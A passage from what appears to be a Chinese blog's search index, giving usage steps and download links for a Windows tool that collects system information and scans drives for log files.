<li>全盘搜索日志文件</li>
</ul>
<h2 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h2><p>程序帮助：<br><img src="/upload_image/20160905/001.png" alt=""></p>
<p>1.运行程序，开始收集系统信息。<br><img src="/upload_image/20160905/002.png" alt=""></p>
<p>2.程序运行期间，可以输入目标磁盘盘符，对该盘进行扫描，获取.log文件；如果不输入直接回车，默认为全盘扫描。<br><img src="/upload_image/20160905/003.png" alt=""></p>
<p>3.运行完毕，会在当前目录下生成采集的日志以及系统信息文件夹。<br><img src="/upload_image/20160905/004.png" alt=""></p>
<blockquote>
<p>注意：如果程序运行报错(MSVCR100.dll),请前往 <a href="https://github.com/tengzhangchao/Windows_Packages/raw/master/VC%2B%2B%20Redist/2010_vcredist_x64.exe" target="_blank" rel="external">下载</a> VC运行库进行安装,安装完成后再次运行程序即可。</p>
</blockquote>
<h2 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h2><p>windows服务器信息收集工具 <a href="https://github.com/tengzhangchao/InForMation" target="_blank" rel="external">下载地址</a></p>
]]></content>
      
        <categories>
            
            <category> 安全工具 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 信息收集工具 </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
